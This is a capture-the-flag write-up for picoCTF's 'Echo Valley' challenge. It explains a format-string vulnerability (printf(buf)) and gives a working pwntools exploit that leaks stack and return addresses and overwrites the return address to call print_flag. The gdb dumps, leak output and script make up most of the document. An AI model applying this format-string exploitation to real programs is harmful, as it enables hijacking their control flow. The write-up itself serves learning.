# PicoCTF - Echo Valley

## Challenge Overview
**Title:** Echo Valley  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** valley.c, valley

## Description
The echo valley is a simple function that echoes back whatever you say to it. But how do you make it respond with something more interesting, like a flag? Download the source: valley.c Download the binary: valley

Additional details will be available after launching your challenge instance.

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```

## Initial Analysis
The binary is 64-bit, **dynamically** linked with **ASLR** enabled.

`main()` calls the `echo_valley()` function which infinitely takes an input and prints it.  
```c
while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
```

We can see a string format **vulnerability** towards the end.

Above `echo_valley()` we find the `print_flag()` function which means we will have to somehow **invoke** it.
## Detailed Analysis
A **classic** way to change the **control flow** of a program is using a **buffer overflow** to linearly overwrite the **return address** of a function.  
Here, we do **not** have a buffer overflow vulnerability **but** a string format which can be used to **write** a value to any address.

**Combining** this two ideas, we have our **exploit**.  
We will overwrite the return address of `echo_valley()` using the string format vulnerability.

A mentioned above, **ASLR** is enabled so the values we use will have to be **calculated** each time we run the binary, but we will **automate** this.  

First, I hop into `gdb` to locate the values in the **stack** that we will need.  
To do so, I set a breakpoint at the `printf()` call inside `echo_valley()` that prints our input
**Note:** Because of **ASLR** we first have to run the binary in gdb **without** any breakpoints in order for gdb to **resolve** the actual addresses. 
```
(gdb) b *0x00005555555553e1
Breakpoint 1 at 0x5555555553e1: file /home/valley/valley.c, line 39.
(gdb) r
Starting program: /home/george/Downloads/valley 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to the Echo Valley, Try Shouting: 
AAAAAA

Breakpoint 1, 0x00005555555553e1 in echo_valley () at /home/valley/valley.c:39
warning: Source file is more recent than executable.
39	        printf(buf);
(gdb) x/32gx $rsp
0x7fffffffdb00:	0x000a414141414141	0x0000000000040000
0x7fffffffdb10:	0x0000000000008000	0x00007fffffffdb48
0x7fffffffdb20:	0x0000004e00000006	0x0000000000000000
0x7fffffffdb30:	0x0000000000000000	0x0000000000000000
0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
0x7fffffffdb50:	0x0000000000000000	0x0000000000000000
0x7fffffffdb60:	0x0000000000000000	0x10c951236013a000
0x7fffffffdb70:	0x00007fffffffdb80	0x0000555555555413
```

At the top of the satck, we see our input `AAAAAA`, and the **last** value is the **return** address.  
By disassembling `main()` we see that the address of the **next** instruction from the call to `echo_valley()` is the same. 

Now, I will enter `%p.` 21 times as my input, to view the stack at runtime.
```
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
You heard in the distance: 0x7fffffffd950.(nil).(nil).0x5555555596f0.0x410.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa2e70252e70252e.(nil).(nil).(nil).(nil).(nil).0x9026e5e25e6d900.0x7fffffffdb80.0x555555555413.
```
We see that:  
1) Our input starts at the **6th** position, so our  offset will be **6**
2) The **last** value is the **return address**
3) The **second last** value is a **stack address**, specifically the one **8 bytes** *after* the return address

This means that now at runtime
1) We will have a **stack address** from which we can **calculate** the position of the **return address** in the stack.
2) The return address of `echo_valley()` from which we can calculate the address of `print_flag().

To find the address of `print_flag()`, we can use `gdb`, disassemble `print_flag()` and get the address of the first instruction.  
`print_flag()` address: **0x0000555555555269**
Return address: **0x0000555555555413**

Offset: Return Address - `print_flag()` address = **0x1AA**.

### Plan of Action
- **Run** the binary and enter `%p.` 21 times
- Get the **second last** value, which is a stack address, and **subtract** 8 bytes
- Get the **last** value, which is the return address, and **subtract**  8 bytes
- Construct our payload

To do all this, I will use a **Python** using `pwntools`

### Script
```python
from pwn import *

target_addr = -0x8
value_to_write = -0x1AA

conn = remote('shape-facility.picoctf.net', 63380)

def find_offset():
   print(conn.recvline())
   payload = b'%p.' * 21
   print(payload)
   conn.sendline(payload)
   print(conn.recvline())
   conn.sendline(b"exit")
   print(conn.recvline())

def extract_flag(output):
   tokens=output.split()
   last_token=tokens[-1]
   print(last_token)

def extract_values(line):
   global value_to_write
   global target_addr
   tokens=line.split('.')
   ret=int(tokens[-2],16)
   stack=int(tokens[-3],16)
   value_to_write+=ret
   target_addr+=stack


def set_values():
   payload = b'%p.' * 21
   conn.sendline(payload)
   line=conn.recvline()
   extract_values(str(line))

def send_payload():
   global value_to_write
   global target_addr
   offset = 6
   conn.recvline()
   set_values()
   payload = fmtstr_payload(offset, {target_addr: value_to_write},write_size='short')
   conn.sendline(payload)
   conn.recvline
   conn.sendline(b"exit")
   output = conn.recvall()
   extract_flag(output)
      
send_payload()
# find_offset()
```

`find_offset()` is a helper function used to easily find the offset.

The script
- Enters `%p.` 21 times
- Extracts the **stack address** and **return address** from the output
- Subtracts their respective **offsets**
- Constructs the **payload** and sends it
- Enters `exit` to trigger `echo_valley()` to return

## Solution
- Use the above **script**
- Change the server name and port number accordingly.
- Run

### Example Output
```
python script.py
[+] Opening connection to shape-facility.picoctf.net on port 63380: Done
[+] Receiving all data: Done (46.57KB)
[*] Closed connection to shape-facility.picoctf.net port 63380
b'picoctf{____REDACTED____}'

```

## Tools Used
- `pwntools`
- `gdb`